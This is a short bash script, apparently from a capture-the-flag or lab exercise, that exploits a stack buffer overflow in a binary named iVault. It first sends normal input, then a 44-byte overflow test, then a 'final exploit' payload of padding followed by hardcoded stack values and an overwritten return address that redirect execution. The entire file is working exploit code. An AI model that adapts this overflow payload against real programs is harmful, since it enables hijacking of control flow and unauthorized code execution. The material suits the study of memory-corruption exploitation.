#!bin/bash

##Normal input
python -c 'print "rajiv"' > in.txt
/home/iVault/iVault < in.txt

##Long input to overwrite the return address
#This doesnt segfault because of remove_protection which overwrites the return address with the correct one
python -c 'print "A"*44' > in.txt
/home/iVault/iVault < in.txt

##Final exploit
python -c 'print "A"*37 + "\x02\x00\x00\x00" + "\x63\x00\x00\x00" + "\x00\x00\x00\x00" + "\x2b\x00\x00\x00" + "\x2b\x00\x00\x00" + "\x44\xd5\xff\xff" + "\x00\x00\x00\x00" + "\xc4\xd4\xff\xff" + "\x7c\xd4\xff\xff" + "\xbc\xd4\xff\xff" + "\x00\xb0\xe1\xf7" + "\xbc\xd4\xff\xff" + "\xfc\xff\xff\xff" + "\x01\x00\x00\x00" + "\x00\x00\x00\x00" + "\x32\x89\x04\x08" + "\x23\x00\x00"' > in.txt
/home/iVault/iVault < in.txt
